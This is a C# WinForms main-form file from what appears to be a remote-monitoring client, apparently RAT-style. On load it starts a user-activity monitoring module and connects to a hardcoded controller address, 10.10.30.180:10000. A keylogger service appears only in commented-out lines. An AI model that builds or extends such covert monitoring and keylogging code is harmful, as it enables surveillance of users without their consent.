//using Client.Logging;
using Client.User;
using Client.Utilities;
using System.Net;

namespace Client
{
    public partial class FrmMain : Form
    {
        private Client.Networking.Client _connectClient;
        //private KeyloggerService _keyloggerService;
        private ActivityDetection _userActivityDetection;

        public SingleInstanceMutex ApplicationMutex;

        public FrmMain()
        {
            InitializeComponent();


        }


        public void Run()
        {
            ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);

            new Task(() =>
            {
                
                _connectClient = new(this);

                //_keyloggerService = new KeyloggerService();
                //_keyloggerService.Start();

                _userActivityDetection = new ActivityDetection(_connectClient);// module giám sát hoạt động của người dùng
                _userActivityDetection.Start();

                _connectClient.Connect(IPAddress.Parse("10.10.30.180"), 10000);

                //Environment.Exit(0);
            }).Start();
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            Run();
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            _connectClient.Disconnect();
            Environment.Exit(0);
        }
    }
}
